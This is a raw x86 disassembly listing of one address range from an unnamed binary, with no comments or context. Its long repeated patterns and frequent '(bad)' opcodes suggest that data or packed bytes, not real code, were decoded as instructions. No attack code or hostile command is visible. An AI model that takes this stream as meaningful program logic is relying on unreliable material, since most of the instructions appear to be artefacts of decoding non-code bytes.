  442706:	add    cl,ch
  442708:	jbe    0x44270c
  44270a:	add    cl,ch
  44270c:	jbe    0x442710
  44270e:	add    cl,ch
  442710:	jbe    0x442714
  442712:	add    cl,ch
  442714:	jbe    0x442718
  442716:	add    cl,ch
  442718:	jbe    0x44271c
  44271a:	add    cl,ch
  44271c:	jbe    0x442720
  44271e:	add    cl,ch
  442720:	add    BYTE PTR [eax],al
  442722:	add    BYTE PTR [eax],al
  442724:	add    BYTE PTR [esi+0x2],dh
  442727:	add    cl,ch
  442729:	jbe    0x44272d
  44272b:	add    cl,ch
  44272d:	jbe    0x442731
  44272f:	add    cl,ch
  442731:	jbe    0x442735
  442733:	add    cl,ch
  442735:	jbe    0x442739
  442737:	add    BYTE PTR [eax],al
  442739:	int3   
  44273a:	(bad)  
  44273b:	(bad)  
  44273c:	(bad)  
  44273d:	fdiv   st(6),st
  44273f:	(bad)  
  442740:	(bad)  
  442741:	fdiv   st(6),st
  442743:	(bad)  
  442744:	dec    esp
  442746:	(bad)  
  442747:	(bad)  
  442748:	dec    esp
  44274a:	(bad)  
  44274b:	(bad)  
  44274c:	call   FWORD PTR [esi+edi*8-0x1630001]
  442753:	(bad)  
  442754:	dec    DWORD PTR [esi+edi*8-0x1730001]
  44275b:	(bad)  
  44275c:	call   FWORD PTR [esi+edi*8-0x1630001]
  442763:	(bad)  
  442764:	dec    DWORD PTR [esi+edi*8-0x1730001]
  44276b:	(bad)  
  44276c:	call   FWORD PTR [esi+eax*1+0x0]
  442770:	add    BYTE PTR [esi+eax*1+0x0],bl
  442774:	add    BYTE PTR [esi+eax*1+0x0],cl
  442778:	add    BYTE PTR [esi+eax*1+0x0],cl
  44277c:	add    BYTE PTR [esi+eax*1+0x0],bl
  442780:	add    BYTE PTR [esi+eax*1+0x0],bl
  442784:	add    BYTE PTR [esi+eax*1+0x0],cl
  442788:	add    BYTE PTR [eax],al
  44278a:	add    BYTE PTR [eax],al
  44278c:	add    BYTE PTR [eax],al
  44278e:	dec    esp
  44278f:	push   es
  442790:	add    BYTE PTR [eax],al
  442792:	sbb    al,0x6
  442794:	add    BYTE PTR [eax],al
  442796:	sbb    al,0x6
  442798:	add    BYTE PTR [eax],al
  44279a:	or     al,0x6
  44279c:	add    BYTE PTR [eax],al
  44279e:	or     al,0x6
  4427a0:	add    BYTE PTR [eax],al
  4427a2:	sbb    al,0x6
  4427a4:	add    BYTE PTR [eax],al
  4427a6:	sbb    al,0x6
  4427a8:	add    BYTE PTR [eax],al
  4427aa:	or     al,0x6
  4427ac:	add    BYTE PTR [eax],al
  4427ae:	or     al,0x6
  4427b0:	add    BYTE PTR [eax],al
  4427b2:	fadd   QWORD PTR ds:0x1b750000
  4427b8:	cld    
  4427b9:	push   DWORD PTR [ebp+0x1b]
  4427bc:	cld    
  4427bd:	push   DWORD PTR [ebp+0x1b]
  4427c0:	cld    
  4427c1:	push   DWORD PTR [ebp+0x1b]
  4427c4:	cld    
  4427c5:	push   DWORD PTR [ebp+0x1b]
  4427c8:	cld    
  4427c9:	push   DWORD PTR [ebp+0x1b]
  4427cc:	cld    
  4427cd:	push   DWORD PTR [ebp+0x1b]
  4427d0:	cld    
  4427d1:	push   DWORD PTR [ebp+0x1b]
  4427d4:	cld    
  4427d5:	push   DWORD PTR [ebp+0x1b]
  4427d8:	cld    
  4427d9:	push   DWORD PTR [ebp+0x1b]
  4427dc:	cld    
  4427dd:	push   DWORD PTR [ebp+0x1b]
  4427e0:	cld    
  4427e1:	push   DWORD PTR [ebp+0x1b]
  4427e4:	cld    
  4427e5:	push   DWORD PTR [ebp+0x1b]
  4427e8:	cld    
  4427e9:	push   DWORD PTR [ebp+0x1b]
  4427ec:	cld    
  4427ed:	push   DWORD PTR [ebp+0x1b]
  4427f0:	cld    
  4427f1:	inc    DWORD PTR [eax]
  4427f3:	add    BYTE PTR [eax],al
  4427f5:	add    BYTE PTR [eax],al
  4427f7:	jne    0x442814
  4427f9:	cld    
  4427fa:	push   DWORD PTR [ebp+0x1b]
  4427fd:	cld    
  4427fe:	push   DWORD PTR [ebp+0x1b]
  442801:	cld    
  442802:	push   DWORD PTR [ebp+0x1b]
  442805:	cld    
  442806:	push   DWORD PTR [ebp+0x1b]
  442809:	cld    
  44280a:	push   DWORD PTR [ebp+0x1b]
  44280d:	cld    
  44280e:	push   DWORD PTR [ebp+0x1b]
  442811:	cld    
  442812:	push   DWORD PTR [ebp+0x1b]
  442815:	cld    
  442816:	push   DWORD PTR [ebp+0x1b]
  442819:	cld    
  44281a:	push   DWORD PTR [ebp+0x1b]
  44281d:	cld    
  44281e:	push   DWORD PTR [ebp+0x1b]
  442821:	cld    
  442822:	push   DWORD PTR [ebp+0x1b]
  442825:	cld    
  442826:	push   DWORD PTR [ebp+0x1b]
  442829:	cld    
  44282a:	push   DWORD PTR [ebp+0x1b]
  44282d:	cld    
  44282e:	push   DWORD PTR [ebp+0x1b]
  442831:	cld    
  442832:	push   DWORD PTR [ebp+0x2]
  442835:	out    0x3,eax
  442837:	jne    0x44283b
  442839:	out    0x3,eax
  44283b:	jne    0x44283f
  44283d:	out    0x3,eax
  44283f:	jne    0x442843
  442841:	out    0x3,eax
  442843:	jne    0x442847
  442845:	out    0x3,eax
  442847:	jne    0x44284b
  442849:	out    0x3,eax
  44284b:	jne    0x44284f
  44284d:	out    0x3,eax
  44284f:	jne    0x442853
  442851:	out    0x3,eax
  442853:	jne    0x442857
  442855:	out    0x3,eax
  442857:	jne    0x44285b
  442859:	out    0x3,eax
  44285b:	add    BYTE PTR [eax],al
  44285d:	add    BYTE PTR [eax],al
  44285f:	add    BYTE PTR [ebp+0x2],dh
  442862:	out    0x3,eax
  442864:	jne    0x442868
  442866:	out    0x3,eax
  442868:	jne    0x44286c
  44286a:	out    0x3,eax
  44286c:	jne    0x442870
  44286e:	out    0x3,eax
  442870:	jne    0x442874
  442872:	out    0x3,eax
  442874:	jne    0x442878
  442876:	out    0x3,eax
  442878:	jne    0x44287c
  44287a:	out    0x3,eax
  44287c:	jne    0x442880
  44287e:	out    0x3,eax
  442880:	jne    0x442884
  442882:	out    0x3,eax
  442884:	jne    0x442888
  442886:	out    0x3,eax
  442888:	jne    0x44288c
  44288a:	out    0x3,eax
  44288c:	jne    0x442890
  44288e:	out    0x3,eax
  442890:	jne    0x442894
  442892:	out    0x3,eax
  442894:	jne    0x442898
  442896:	out    0x3,eax
  442898:	jne    0x44289c
  44289a:	out    0x3,eax
  44289c:	jne    0x4428a0
  44289e:	out    0x3,eax
  4428a0:	jne    0x4428a4
  4428a2:	out    0x3,eax
  4428a4:	jne    0x4428a8
  4428a6:	out    0x3,eax
  4428a8:	jne    0x4428ac
  4428aa:	out    0x3,eax
  4428ac:	jne    0x4428b0
  4428ae:	out    0x3,eax
  4428b0:	jne    0x4428b4
  4428b2:	add    cl,ch
  4428b4:	jbe    0x4428b8
  4428b6:	add    cl,ch
  4428b8:	jbe    0x4428bc
  4428ba:	add    cl,ch
  4428bc:	jbe    0x4428c0
  4428be:	add    cl,ch
  4428c0:	jbe    0x4428c4
  4428c2:	add    cl,ch
  4428c4:	add    BYTE PTR [eax],al
  4428c6:	add    BYTE PTR [eax],al
  4428c8:	add    BYTE PTR [esi+0x2],dh
  4428cb:	add    cl,ch
  4428cd:	jbe    0x4428d1
  4428cf:	add    cl,ch
  4428d1:	jbe    0x4428d5
  4428d3:	add    cl,ch
  4428d5:	jbe    0x4428d9
  4428d7:	add    cl,ch
  4428d9:	jbe    0x4428dd
  4428db:	add    cl,ch
  4428dd:	jbe    0x4428e1
  4428df:	add    cl,ch
  4428e1:	jbe    0x4428e5
  4428e3:	add    cl,ch
  4428e5:	jbe    0x4428e9
  4428e7:	add    cl,ch
  4428e9:	jbe    0x4428ed
  4428eb:	add    cl,ch
  4428ed:	jbe    0x4428f1
  4428ef:	add    cl,ch
  4428f1:	jbe    0x4428f5
  4428f3:	add    cl,ch
  4428f5:	jbe    0x4428f9
  4428f7:	add    cl,ch
  4428f9:	jbe    0x4428fd
  4428fb:	add    cl,ch
  4428fd:	jbe    0x442901
  4428ff:	add    cl,ch
  442901:	jbe    0x442905
  442903:	add    cl,ch
  442905:	jbe    0x442909
  442907:	add    cl,ch
  442909:	jbe    0x44290d
  44290b:	add    cl,ch
  44290d:	jbe    0x442911
  44290f:	add    cl,ch
  442911:	jbe    0x442915
  442913:	add    cl,ch
  442915:	jbe    0x442919
  442917:	add    cl,ch
  442919:	jbe    0x44291d
  44291b:	add    cl,ch
  44291d:	jbe    0x442921
  44291f:	add    cl,ch
  442921:	jbe    0x442925
  442923:	add    cl,ch
  442925:	jbe    0x442929
  442927:	add    cl,ch
  442929:	jbe    0x44292d
  44292b:	add    cl,ch
  44292d:	add    BYTE PTR [eax],al
  44292f:	add    BYTE PTR [eax],al
  442931:	add    BYTE PTR [esi+0x2],dh
  442934:	add    BYTE PTR [eax],al
  442936:	sbb    al,0x3
  442938:	add    BYTE PTR [eax],al
  44293a:	sbb    al,0x3
  44293c:	add    BYTE PTR [eax],al
  44293e:	or     al,0x3
  442940:	add    BYTE PTR [eax],al
  442942:	or     al,0x3
  442944:	add    BYTE PTR [eax],al
  442946:	fadd   QWORD PTR [edx]
  442948:	add    BYTE PTR [eax],al
  44294a:	fadd   QWORD PTR [edx]
  44294c:	add    BYTE PTR [eax],al
  44294e:	int3   
  44294f:	add    al,BYTE PTR [eax]
  442951:	add    ah,cl
  442953:	add    al,BYTE PTR [eax]
  442955:	add    ah,bl
  442957:	add    al,BYTE PTR [eax]
  442959:	add    ah,bl
  44295b:	add    al,BYTE PTR [eax]
  44295d:	add    ah,cl
  44295f:	add    al,BYTE PTR [eax]
  442961:	add    ah,cl
  442963:	add    al,BYTE PTR [eax]
  442965:	add    BYTE PTR [edx+eax*1+0x29c0000],bl
  44296c:	add    BYTE PTR [eax],al
  44296e:	mov    WORD PTR [edx],es
  442970:	add    BYTE PTR [eax],al
  442972:	mov    WORD PTR [edx],es
  442974:	add    BYTE PTR [eax],al
  442976:	pushf  
  442977:	add    al,BYTE PTR [eax]
  442979:	add    BYTE PTR [edx+eax*1+0x28c0000],bl
  442980:	add    BYTE PTR [eax],al
  442982:	mov    WORD PTR [edx],es
  442984:	add    BYTE PTR [eax],al
  442986:	pop    esp
  442987:	add    al,BYTE PTR [eax]
  442989:	add    BYTE PTR [edx+eax*1+0x0],bl
  44298d:	add    BYTE PTR [edx+eax*1+0x0],cl
  442991:	add    BYTE PTR [edx+eax*1+0x0],cl
  442995:	add    BYTE PTR [eax],al
  442997:	add    BYTE PTR [eax],al
  442999:	add    BYTE PTR [eax],al
  44299b:	pop    esp
  44299c:	add    al,BYTE PTR [eax]
  44299e:	add    BYTE PTR [edx+eax*1+0x0],bl
  4429a2:	add    BYTE PTR [edx+eax*1+0x0],cl
  4429a6:	add    BYTE PTR [edx+eax*1+0x0],cl
  4429aa:	add    BYTE PTR [edx+eax*1],bl
  4429ad:	add    BYTE PTR [eax],al
  4429af:	sbb    al,0x2
  4429b1:	add    BYTE PTR [eax],al
  4429b3:	jne    0x4429da
  4429b5:	push   0xffffff9f
  4429b7:	cmp    eax,0x7034e242
  4429bc:	adc    ebp,DWORD PTR ds:0xb2903572
  4429c2:	adc    DWORD PTR [edi-0x7a],0xffffffbc
  4429c6:	push   esi
  4429c7:	pop    ebp
  4429c8:	aam    0x28
  4429ca:	stos   BYTE PTR es:[edi],al
  4429cb:	sahf   
  4429cc:	xchg   esp,eax
  4429cd:	retf   
  4429ce:	test   al,0xcd
  4429d0:	mov    ecx,0x1f156674
  4429d5:	mov    cl,0x27
  4429d7:	cwde   
  4429d8:	je     0x4429bc
  4429da:	xor    DWORD PTR [edx+eax*4-0x5e],edi
  4429de:	mov    edx,0xec10cfd7
  4429e3:	mov    ebp,DWORD PTR [ebx-0x1ce397fe]
  4429e9:	sub    ebp,esp
  4429eb:	cmp    BYTE PTR [edi+ebx*1],cl
  4429ee:	or     DWORD PTR [esi+0x41f27f7],0x3101d513
  4429f8:	add    eax,0xf2ad9f25
  4429fd:	dec    esp
  4429fe:	mov    esp,0x0
  442a03:	add    BYTE PTR [ebp+0x40],dl
  442a06:	or     DWORD PTR [ebx+0x225a7a00],esp
  442a0c:	pop    esp
  442a0d:	mov    eax,0x935e4695
  442a12:	cli    
  442a13:	mov    esp,0xd3afb627
  442a18:	pop    edx
  442a19:	jbe    0x442a0f
  442a1b:	adc    BYTE PTR [edx],ah
  442a1d:	hlt    
  442a1e:	sub    eax,0x67c6f341
  442a23:	callw  0x6753
  442a27:	mov    WORD PTR [ebx+0x6d75d8f9],fs
  442a2d:	push   esi
  442a2e:	fcom   DWORD PTR [eax+edi*1-0x5b9009fe]
  442a35:	jle    0x442a04
  442a37:	mov    ebx,0x9ac54631
  442a3c:	(bad)  
  442a3d:	pop    esi
  442a3e:	shr    BYTE PTR ds:0xd8205d8e,0x77
  442a45:	lahf   
  442a46:	or     ah,BYTE PTR [edx+0x74]
  442a49:	jne    0x442a4a
  442a4b:	xchg   BYTE PTR [ecx+ecx*1-0x8],dh
  442a4f:	sub    eax,0xb30d6c02
  442a54:	add    DWORD PTR ds:0x3f5f5189,ebp
  442a5a:	scas   al,BYTE PTR es:[edi]
  442a5b:	cwde   
  442a5c:	iret   
  442a5d:	shl    BYTE PTR ds:0x48d5e26d,0xb8
  442a64:	fild   QWORD PTR [ecx-0x25]
  442a67:	popa   
  442a68:	add    BYTE PTR [eax],al
  442a6a:	add    BYTE PTR [eax],al
  442a6c:	add    BYTE PTR [ecx+0x1a],bh
  442a6f:	xor    BYTE PTR [edx-0x627a57cf],bl
  442a75:	(bad)  
  442a76:	aad    0x36
  442a78:	out    0x1f,eax
  442a7a:	aas    
  442a7b:	mov    ds:0x63bc5e4b,eax
  442a80:	shr    cl,cl
  442a82:	adc    BYTE PTR [esi-0x64ec342d],ah
  442a88:	arpl   WORD PTR [edi],ax
  442a8a:	mov    esi,0xa782d7e3
  442a8f:	xchg   ecx,edi
  442a91:	xor    al,0x75
  442a93:	arpl   WORD PTR [edx+0x12],ax
  442a96:	and    BYTE PTR [ebp+0x676c83af],ch
  442a9c:	cdq    
  442a9d:	dec    ebx
  442a9e:	popa   
  442a9f:	aas    
  442aa0:	mov    dl,0x20
  442aa2:	icebp  
  442aa3:	dec    edx
  442aa4:	mov    esp,0x2cf461ff
  442aa9:	(bad)  
  442aaa:	retf   0xcf29
  442aad:	xor    dh,BYTE PTR [edi+0x78c792ff]
  442ab3:	jbe    0x442aa8
  442ab5:	dec    edx
  442ab6:	adc    ch,BYTE PTR [eax-0x1a1437ed]
  442abc:	daa    
  442abd:	mov    BYTE PTR [ecx+0x59a6dca0],dl
  442ac3:	ss loopne 0x442a58
  442ac6:	dec    ebp
  442ac7:	jb     0x442b37
  442ac9:	pusha  
  442aca:	dec    ebp
  442acb:	lea    ecx,[edx-0xb67da86]
  442ad1:	add    BYTE PTR [eax],al
  442ad3:	add    BYTE PTR [eax],al
  442ad5:	add    ah,dh
  442ad7:	add    al,0x8c
  442ad9:	nop
  442ada:	xrelease xchg DWORD PTR [eax-0x2e],ebp
  442ade:	in     al,0x72
  442ae0:	es xchg esi,eax
  442ae2:	mov    ebx,DWORD PTR [edi-0x247d4021]
  442ae8:	mov    bl,0xff
  442aea:	xor    eax,0xc82fdd4a
  442aef:	jp     0x442a74
  442af1:	xor    DWORD PTR [edi+0x9],edx
  442af4:	mov    BYTE PTR [esi],ch
  442af6:	push   ss
  442af7:	dec    esp
  442af8:	sbb    al,0x20
  442afa:	jo     0x442b66
  442afc:	(bad)  
  442afd:	fs test eax,0x59ed3ffc
  442b03:	mov    ds:0x2ac3ed5,eax
  442b08:	and    ah,bh
  442b0a:	xor    eax,0x9d3bdffb
  442b0f:	cwde   
  442b10:	loope  0x442b1b
  442b12:	dec    esi
  442b13:	imul   edx,DWORD PTR [edi-0x31],0xffffffde
  442b17:	mov    ds,WORD PTR [edi]
  442b19:	push   ebx
  442b1a:	(bad)  
  442b1b:	shl    BYTE PTR [ebp+0x62],cl
  442b1e:	js     0x442b61
  442b20:	dec    ecx
  442b21:	imul   edi,DWORD PTR [ecx-0x195a0853],0xffffffa4
  442b28:	std    
  442b29:	jnp    0x442af7
  442b2b:	jmp    0xb6a6:0xd40800e3
  442b32:	xchg   ecx,eax
  442b33:	dec    esi
  442b34:	repz push 0x5c
  442b37:	lahf   
  442b38:	nop
  442b39:	int3   
  442b3a:	add    BYTE PTR [eax],al
  442b3c:	add    BYTE PTR [eax],al
  442b3e:	add    BYTE PTR [edx-0x33],ch
  442b41:	jnp    0x442b2f
  442b43:	dec    edi
  442b44:	lock bndstx [eax],bnd2
  442b48:	mov    dl,0xf9
  442b4a:	add    edi,DWORD PTR [eax-0x6972af9d]
  442b50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  442b51:	das    
  442b52:	mov    cl,0x8c
  442b54:	loope  0x442b9c
  442b56:	retf   
  442b57:	fisttp WORD PTR [eax+esi*4]
  442b5a:	adc    DWORD PTR [ecx+0x6e53bd5e],ebx
  442b60:	mov    ebx,0xe9425aad
  442b65:	add    esp,DWORD PTR [eax-0x33]
  442b68:	add    al,0x2b
  442b6a:	ss sub al,0xb9
  442b6d:	and    edi,edi
  442b6f:	jbe    0x442b9d
  442b71:	pop    eax
  442b72:	jne    0x442ba5
  442b74:	add    dh,bh
  442b76:	and    BYTE PTR [ebp+esi*4-0x123f73d7],ch
  442b7d:	std    
  442b7e:	cmp    BYTE PTR [ecx-0x34],0xa4
  442b82:	les    edx,FWORD PTR [ebx-0x19a1c259]
  442b88:	push   es
  442b89:	call   0x51c:0x829c0a2a
  442b90:	cmc    
  442b91:	pop    esi
  442b92:	pop    ebx
  442b93:	push   edi
  442b94:	jae    0x442b81
  442b96:	je     0x442b6a
  442b98:	push   eax
  442b99:	cmp    bl,0xca
  442b9c:	scas   al,BYTE PTR es:[edi]
  442b9d:	test   BYTE PTR [edi+ebp*1],dl
  442ba0:	shrd   DWORD PTR [bx+si],eax,0x0
  442ba5:	add    BYTE PTR [eax],al
  442ba7:	add    BYTE PTR [ecx+edi*2],ah
  442baa:	imul   ebp,DWORD PTR [ecx+0x7eaa2e6e],0x509bbb75
  442bb4:	inc    ebp
  442bb5:	pop    esi
  442bb6:	inc    eax
  442bb7:	push   ebp
  442bb8:	mov    eax,0x35a92161
  442bbd:	out    dx,al
  442bbe:	(bad)  
  442bbf:	in     al,0x93
  442bc1:	adc    eax,0x2daeb9ea
  442bc6:	and    BYTE PTR [edx],cl
  442bc8:	stos   DWORD PTR es:[edi],eax
  442bc9:	mov    ebp,0x9904228d
  442bce:	scas   al,BYTE PTR es:[edi]
  442bcf:	adc    al,0x50
  442bd1:	ss retf 
  442bd3:	int3   
  442bd4:	inc    ecx
  442bd5:	aaa    
  442bd6:	retf   
  442bd7:	int3   
  442bd8:	mov    al,ds:0xee51eb7d
  442bdd:	mov    edi,0x7a6d8a07
  442be2:	dec    edx
  442be3:	(bad)  
  442be4:	(bad)  
  442be5:	pop    ds
  442be6:	pop    edx
  442be7:	ret    
  442be8:	inc    eax
  442be9:	jge    0x442bd6
  442beb:	push   ecx
  442bec:	dec    ebx
  442bed:	shr    DWORD PTR [ecx+ecx*8],1
  442bf0:	push   ecx
  442bf1:	jge    0x442c61
  442bf3:	xor    dh,bh
  442bf5:	mov    al,0xb
  442bf7:	mov    eax,DWORD PTR [ebx+0x6]
  442bfa:	test   DWORD PTR [esi+0x6d],eax
  442bfd:	jnp    0x442c41
  442bff:	cld    
  442c00:	out    dx,al
  442c01:	test   al,0x1f
  442c03:	mov    ebp,DWORD PTR [ebx-0x7e]
  442c06:	cmp    BYTE PTR [ebx+0x21],ch
  442c09:	add    DWORD PTR [eax+0x3f],eax
  442c0f:	add    BYTE PTR [eax],al
  442c11:	cs scas al,BYTE PTR es:[edi]
  442c13:	std    
  442c14:	jmp    0xc798:0x8b59c98c
  442c1b:	mov    esp,0xeb7d20cc
  442c20:	adc    DWORD PTR [ecx+0x6d4584de],0x7b
  442c27:	inc    edx
  442c28:	loopne 0x442c28
  442c2a:	mov    dh,0xdf
  442c2c:	mov    eax,eax
  442c2e:	and    bh,ah
  442c30:	push   eax
  442c31:	mov    eax,ds:0xeee4527b
  442c36:	mov    esi,0xaabd8be3
  442c3b:	cld    
  442c3c:	dec    esp
  442c3d:	jge    0x442cba
  442c3f:	dec    edx
  442c40:	clc    
  442c41:	out    dx,al
  442c42:	into   
  442c43:	test   DWORD PTR [ebx+0x44fcdeb7],0xe8427b7d
  442c4d:	(bad)  
  442c4e:	mov    dh,0xf7
  442c50:	mov    eax,esp
  442c52:	loop   0x442c50
  442c54:	push   esp
  442c55:	ins    DWORD PTR es:[edi],dx
  442c56:	jnp    0x442caa
  442c58:	lock (bad) 
  442c5a:	mov    esi,0x6bd8bf7
  442c5f:	std    
  442c60:	dec    esp
  442c61:	ins    DWORD PTR es:[edi],dx
  442c62:	jnp    0x442cae
  442c64:	cld    
  442c65:	xor    bh,BYTE PTR [edi+0x27500f3]
  442c6b:	add    bl,ch
  442c6d:	jl     0x442cec
  442c6f:	push   edx
  442c70:	hlt    
  442c71:	test   BYTE PTR [ebx-0x2],0x88
  442c75:	add    BYTE PTR [eax],al
  442c77:	add    BYTE PTR [eax],al
  442c79:	add    BYTE PTR [eax+0x2e],al
  442c7c:	test   BYTE PTR [ebp-0x33],al
  442c7f:	jl     0x442ccb
  442c81:	hlt    
  442c82:	mov    ?,WORD PTR [edx+0x7d2d7317]
  442c88:	push   edx
  442c89:	lock out dx,al
  442c8b:	add    edi,ebp
  442c8d:	inc    esp
  442c8e:	jge    0x442d0b
  442c90:	inc    edx
  442c91:	fcomp  QWORD PTR [edi]
  442c93:	clc    
  442c94:	lods   al,BYTE PTR ds:[si]
  442c96:	jbe    0x442c5a
  442c98:	dec    DWORD PTR [edx-0x17b1b9d8]
  442c9e:	and    eax,0xf6000003
  442ca3:	cmp    eax,0xaeb5850b
  442ca8:	adc    al,0x8b
  442caa:	and    BYTE PTR [esi],ch
  442cac:	test   BYTE PTR [ebp+0x5d],al
  442caf:	clc    
  442cb0:	mov    al,0xc
  442cb2:	lds    edi,FWORD PTR [ecx+0x4a]
  442cb5:	in     al,dx
  442cb6:	out    dx,al
  442cb7:	int    0xeb
  442cb9:	mov    esi,DWORD PTR [eax-0x1afb7bda]
  442cbf:	add    eax,DWORD PTR [ebx+0x8]
  442cc2:	pop    esi
  442cc3:	test   BYTE PTR [ebp+ecx*2+0x4be8445],0xec
  442ccb:	mov    ch,0xef
  442ccd:	jmp    0x442ca8
  442ccf:	repz mov edi,0xbcc6108b
  442cd5:	int3   
  442cd6:	xor    DWORD PTR [edi],esi
  442cd8:	retf   
  442cd9:	int3   
  442cda:	sub    DWORD PTR [edi],esi
  442cdc:	retf   
  442cdd:	int3   
  442cde:	add    BYTE PTR [eax],al
  442ce0:	add    BYTE PTR [eax],al
  442ce2:	add    BYTE PTR [ecx+0x37],al
  442ce5:	retf   
  442ce6:	int3   
  442ce7:	mov    al,ds:0x1183eb7b
  442cec:	or     ebp,eax
  442cee:	add    eax,0x89f827fa
  442cf3:	cmp    BYTE PTR [edx],bl
  442cf5:	test   BYTE PTR [ebp-0x23],al
  442cf8:	shl    bh,cl
  442cfa:	sub    edx,esp
  442cfc:	daa    
  442cfd:	clc    
  442cfe:	xor    DWORD PTR [ecx-0x32bb6302],0xffffffc3
  442d05:	jmp    DWORD PTR [edi+0x9]
  442d08:	add    al,0x40
  442d0a:	add    dh,ch
  442d0c:	mov    ch,0xe7
  442d0e:	push   ecx
  442d0f:	mov    edx,0x36f8440d
  442d14:	add    bl,BYTE PTR [ebp-0x3c52b8]
  442d1a:	imul   esi,DWORD PTR [ebp-0x64],0x3a967ff
  442d21:	inc    eax
  442d22:	add    BYTE PTR [edx+0x36f8480d],dl
  442d28:	add    al,BYTE PTR [edi+0x423f8d45]
  442d2e:	cld    
  442d2f:	jne    0x442d33
  442d31:	add    BYTE PTR [eax],al
  442d33:	pop    esi
  442d34:	stc    
  442d35:	test   BYTE PTR [ebp+0x69],dl
  442d38:	cmp    DWORD PTR [ebp-0x43313ff],0xffffff83
  442d3f:	fsub   DWORD PTR [esi]
  442d41:	pop    es
  442d42:	jae    0x442cd8
  442d44:	jnp    0x442d88
  442d46:	cld    
  442d47:	add    BYTE PTR [eax],al
  442d49:	add    BYTE PTR [eax],al
  442d4b:	add    dh,bh
  442d4d:	cmc    
  442d4e:	or     BYTE PTR [esi+esi*2-0x11af003e],0xcc
  442d56:	out    0x52,eax
  442d58:	xor    cl,BYTE PTR ds:0x2b6f844
  442d5e:	test   DWORD PTR [ebp+0x21],ecx
  442d61:	jns    0x442d66
  442d63:	lea    esi,[ecx+0x1e003c2a]
  442d69:	push   edx
  442d6a:	test   ch,ah
  442d6c:	test   al,0x43
  442d6e:	retf   
  442d6f:	int3   
  442d70:	xor    DWORD PTR [esi],esi
  442d72:	retf   
  442d73:	int3   
  442d74:	sub    DWORD PTR [esi],esi
  442d76:	retf   
  442d77:	int3   
  442d78:	shl    DWORD PTR ds:0x7b40cccb,0xeb
  442d7f:	mov    eax,ds:0x3c2a15
  442d84:	fwait
  442d85:	jnp    0x442dc6
  442d87:	xor    dh,bh
  442d89:	mov    ah,0x7
  442d8b:	ds cld 
  442d8d:	mov    ecx,0x35b65d07
  442d92:	retf   
  442d93:	int3   
  442d94:	test   eax,0xc1cccb35
  442d99:	xor    eax,0x7b40cccb
  442d9e:	jmp    0x442d2b
  442da0:	cmp    dh,dh
  442da2:	dec    edi
  442da3:	mov    ebp,DWORD PTR [eax]
  442da5:	cli    
  442da6:	dec    esi
  442da7:	jmp    FWORD PTR [eax-0x42]
  442daa:	test   DWORD PTR [ebx+0x75],0xccbcc5
  442db1:	add    BYTE PTR [eax],al
  442db3:	add    BYTE PTR [eax],al
  442db5:	mov    cl,0x35
  442db7:	retf   
  442db8:	int3   
  442db9:	test   eax,0x41cccb35
  442dbe:	aaa    
  442dbf:	retf   
  442dc0:	int3   
  442dc1:	sar    BYTE PTR [ecx-0x15],0x83
  442dc5:	push   ecx
  442dc6:	sti    
  442dc7:	gs add bh,cl
  442dca:	add    ch,BYTE PTR [eax-0x24]
  442dcd:	jbe    0x442d91
  442dcf:	(bad)  
  442dd0:	(bad)  
  442dd1:	pusha  
  442dd2:	mov    edx,0x7b7543f7
  442dd7:	inc    edx
  442dd8:	clc    
  442dd9:	int    0x1a
  442ddb:	cld    
  442ddc:	aas    
  442ddd:	jne    0x442e58
  442ddf:	inc    edx
  442de0:	clc    
  442de1:	lds    ebx,FWORD PTR [edx]
  442de3:	mov    ch,0xff
  442de5:	and    ah,BYTE PTR [esi]
  442de7:	jl     0x442dad
  442de9:	ins    DWORD PTR es:[edi],dx
  442dea:	jnp    0x442e2e
  442dec:	cld    
  442ded:	(bad)  
  442dee:	mov    bh,0xf
  442df0:	push   ecx
  442df1:	dec    bh
  442df3:	or     edx,DWORD PTR [edx-0x12]
  442df6:	mov    edi,0xcffa5007
  442dfb:	sti    
  442dfc:	mov    ebx,eax
  442dfe:	(bad)  
  442dff:	mov    esp,0xeb7940cc
  442e04:	push   ecx
  442e05:	mov    edx,0x7500fbbf
  442e0a:	add    al,BYTE PTR [eax]
  442e0c:	jmp    0x442e8a
  442e0e:	jns    0x442e52
  442e10:	cld    
  442e11:	test   BYTE PTR [edx-0x2],0x88
  442e15:	cmp    BYTE PTR [esi],ah
  442e17:	test   BYTE PTR [ebp+0x0],cl
  442e1a:	add    BYTE PTR [eax],al
  442e1c:	add    BYTE PTR [eax],al
  442e1e:	mov    ecx,0x26104ae9
  442e23:	add    eax,0x17d5585
  442e28:	push   ebx
  442e29:	cld    
  442e2a:	jb     0x442e98
  442e2c:	std    
  442e2d:	mov    ch,BYTE PTR [eax]
  442e2f:	idiv   ah
  442e31:	dec    esp
  442e32:	xchg   ecx,eax
  442e33:	cmc    
  442e34:	mov    cl,0x11
  442e36:	dec    esi
  442e37:	inc    eax
  442e38:	jae    0x442e41
  442e3a:	mov    ebp,0x75000003
  442e3f:	sbb    DWORD PTR [ebx],eax
  442e41:	jmp    0x442e88
  442e43:	icebp  
  442e44:	mov    edi,0xbcc7508b
  442e49:	int3   
  442e4a:	xor    DWORD PTR [esi],esi
  442e4c:	retf   
  442e4d:	int3   
  442e4e:	sub    DWORD PTR [esi],esi
  442e50:	retf   
  442e51:	int3   
  442e52:	inc    ecx
  442e53:	ss retf 
  442e55:	int3   
  442e56:	mov    al,ds:0x5db9eb79
  442e5b:	add    al,BYTE PTR [eax]
  442e5d:	add    cl,dl
  442e5f:	jns    0x442e67
  442e61:	mov    DWORD PTR [eax+0x7543f762],eax
  442e67:	(bad)  
  442e68:	mov    esp,0xcb3631cc
  442e6d:	int3   
  442e6e:	sub    DWORD PTR [esi],esi
  442e70:	retf   
  442e71:	int3   
  442e72:	inc    ecx
  442e73:	ss retf 
  442e75:	int3   
  442e76:	mov    al,ds:0x1183eb79
  442e7b:	adc    al,BYTE PTR [ebp+0x77816d45]
  442e81:	add    al,0x0
  442e83:	add    BYTE PTR [eax],al
  442e85:	add    BYTE PTR [eax],al
  442e87:	jne    0x442e7e
  442e89:	or     DWORD PTR [eax-0x74fffd8b],0x30
  442e90:	cli    
  442e91:	test   BYTE PTR [ecx+0x71],dl
  442e94:	and    ebp,0x8617a408
  442e9a:	push   ebp
  442e9b:	sar    DWORD PTR [eax+0x42],0x8
  442e9f:	test   BYTE PTR [ecx+0x7],0x89
  442ea3:	xor    BYTE PTR [edx],dh
  442ea5:	rol    BYTE PTR [ebp-0x4f],0x1
  442ea9:	add    BYTE PTR [eax],al
  442eab:	jne    0x442ec6
